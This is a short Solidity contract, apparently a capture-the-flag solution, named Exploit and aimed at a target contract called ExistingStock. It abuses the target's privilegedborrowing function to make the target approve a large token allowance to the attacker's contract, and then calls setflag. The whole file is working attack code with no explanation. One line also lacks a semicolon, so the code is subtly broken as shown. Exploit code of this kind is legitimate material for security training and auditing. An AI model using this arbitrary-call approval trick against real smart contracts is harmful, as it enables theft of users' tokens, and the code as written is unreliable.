pragma solidity ^0.7.0;

contract Exploit {
    IExistingStock call;

    function exploit(address ExistingStock) public {
        call = IExistingStock(ExistingStock);
        call.transfer(address(call),2000000)
        call.privilegedborrowing(1000,address(0),address(call),abi.encodePacked(bytes4(keccak256("approve(address,uint256)")), abi.encode(address(this), uint256(2000000))));
        call.setflag();
    }
}

interface IExistingStock {
    function transfer(address,uint256) external;
    function privilegedborrowing(uint256, address, address, bytes calldata) external;
    function setflag() external;
}
